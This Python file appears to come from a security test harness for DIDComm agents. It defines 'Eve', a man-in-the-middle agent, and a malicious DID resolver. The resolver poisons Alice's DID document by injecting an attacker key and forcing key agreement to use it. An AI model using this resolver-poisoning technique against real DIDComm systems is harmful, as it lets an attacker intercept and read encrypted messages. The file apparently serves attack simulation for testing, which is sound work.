import json
from dataclasses import asdict
from typing import Optional

from didcomm.common.resolvers import ResolversConfig
from didcomm.common.types import DID, VerificationMethodType, VerificationMaterial, VerificationMaterialFormat
from didcomm.did_doc.did_doc import DIDDoc, VerificationMethod
from didcomm.did_doc.did_resolver import DIDResolver
from mcp import ClientSession, StdioServerParameters, stdio_client

from common import rehydrate_after_mcp_tool_call
from common.agents import Agent
from common.config import config
from common.didcomm_interfaces import SecretsResolver4JWK
from common.waltid_core import WaltIdClient as waltid
from common.waltid_core import WaltIdSession
from dids_resolver import resolve

# =================== CONFIG ===================
cfg = config()

ALICE_DID = cfg["DIDs"]["alice"]


# ==============================================

class MalignantDIDResolver(DIDResolver):
    """ Malignant DID resolver for the MITM """

    def __init__(self, alice_did: str):
        self.alice_did = alice_did

    async def resolve(self, did: "DID") -> "DIDDoc":
        doc = resolve(str(did))

        # ! --- Poisoning for Eve ---
        if str(did) == self.alice_did:
            fake_vm = {
                "id": f"{doc['id']}#1",
                "type": "JsonWebKey2020",
                "controller": doc["id"],
                "publicKeyJwk": {
                    "kty": "EC",
                    "crv": "P-256",
                    "kid": "poisoned-pkey",
                    "x": "7qFMwMKO6DTkV3KS4AgcCxbDJiROkxMfhogoLQ-RWpo",
                    "y": "m7yxUjX7w8WO0Qc50R-2HlwQZcXG2Eh99M9fMS7v4vA",
                },
            }

            doc.setdefault("verificationMethod", [])
            doc["verificationMethod"].append(fake_vm)

            doc["keyAgreement"] = [fake_vm["id"]]  # ! force key-agreement

        vm_by_id = {m["id"]: m for m in doc.get("verificationMethod", [])}

        def build_vm(vm_dict: dict) -> "VerificationMethod":
            return VerificationMethod(
                id=vm_dict["id"],
                type=VerificationMethodType(1),  # JSON_WEB_KEY_2020 = 1
                controller=vm_dict.get("controller", doc["id"]),
                verification_material=VerificationMaterial(
                    format=VerificationMaterialFormat(1),  # JWK = 1
                    value=json.dumps(vm_dict["publicKeyJwk"]),
                ),
            )

        kids_needed = set(doc.get("keyAgreement", [])) | set(doc.get("authentication", []))

        verification_methods = []
        for kid in kids_needed:
            vm_dict = vm_by_id.get(kid)
            if vm_dict is None:
                raise ValueError(f"Missing verificationMethod for kid: {kid}")
            verification_methods.append(build_vm(vm_dict))

        return DIDDoc(
            did=doc["id"],
            key_agreement_kids=doc.get("keyAgreement", []),
            authentication_kids=doc.get("authentication", []),
            verification_methods=verification_methods,
            didcomm_services=[],
        )


class Eve(Agent):
    def __init__(self):
        super().__init__(env_file_path="test/eve/eve.env")
        self.mcp_session: ClientSession | None = None

    async def mcp_connect(self, command: str, args: Optional[list[str]] = None) -> None:
        """ Establishes a connection to an MCP server using provided command and arguments. """
        server_params = StdioServerParameters(
            command=command,
            args=args,
        )

        # start server process (stdio)
        read, write = await self._exit_stack.enter_async_context(
            stdio_client(server_params)
        )

        # set mcp_session
        self.mcp_session = await self._exit_stack.enter_async_context(
            ClientSession(read, write)
        )

        # initialize protocol
        init_result = await self.mcp_session.initialize()

    async def sign_in(self) -> None:
        """ Logs the user into WaltID via an MCP session and retrieves the default DID. """
        if not self.mcp_session:
            raise RuntimeError("MCP Session not initialized. Call mcp_connect() first.")

        result = await self.mcp_session.call_tool(
            name="authenticate",
            arguments={"email": self.email, "password": self.password}
        )

        # set the waltid_session attribute
        self.waltid_session = rehydrate_after_mcp_tool_call(
            tool_result=result,
            target_class=WaltIdSession
        )

        # set the default DID
        did_result = await self.mcp_session.call_tool(
            name="get_default_did",
            arguments={"session": asdict(self.waltid_session)}
        )

        if did_result.content and hasattr(did_result.content[0], 'text'):
            self.did = rehydrate_after_mcp_tool_call(tool_result=did_result, target_class=str)
        else:
            raise ValueError("Impossible to retrieve DID from WaltID")

    def set_malignant_resolvers_config(self) -> None:
        """ Configures a malignant DIDs resolver """

        # initialize DIDs resolver
        did_resolver = MalignantDIDResolver(alice_did=ALICE_DID)

        # initialize secrets resolver
        secrets_resolver = SecretsResolver4JWK(
            waltid=waltid,
            session=self.waltid_session,
            cache=True
        )

        self.resolvers_config = ResolversConfig(
            secrets_resolver=secrets_resolver,
            did_resolver=did_resolver,
        )
